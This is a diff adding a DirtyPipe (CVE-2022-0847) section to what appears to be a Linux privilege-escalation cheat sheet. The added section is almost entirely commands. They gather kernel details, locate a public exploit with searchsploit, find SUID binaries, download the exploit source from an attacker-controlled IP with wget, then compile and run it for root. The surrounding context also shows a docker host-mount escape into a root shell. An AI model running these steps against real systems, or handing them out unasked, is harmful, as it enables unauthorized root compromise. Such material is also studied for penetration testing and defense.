@@ -411,6 +411,48 @@ docker images
 docker run -it -v /:/host/ <image>:<tag> chroot /host/ bash
 ```
 
+## Kernel Vulnerabilities
+### DirtyPipe - CVE-2022-0847
+-> Get information
+```bash
+cat /etc/issue
+uname -r
+arch
+```
+
+-> Validate softwares
+```bash
+whereis gcc
+whereis python
+whereis curl
+whereis wget
+```
+
+-> Searching public exploit
+```bash
+searchsploit "linux kernel 5.9"
+searchsploit -m 50808.c
+```
+
+-> Find file has a SUID permission
+```bash
+find / -perm -u=s -type f 2>/dev/null
+```
+
+-> Move to target and compile
+```bash
+cd /tmp
+wget http://<IP>/50808.c
+chmod +x 50808.c
+gcc 50808.c -o 50808
+```
+
+-> Exploit
+```bash
+./50808 <SUID-FILE>
+```
+
+
 ### Linux Enumeration Tools [PrivEsc]
 -> Linpeas
 ```bash
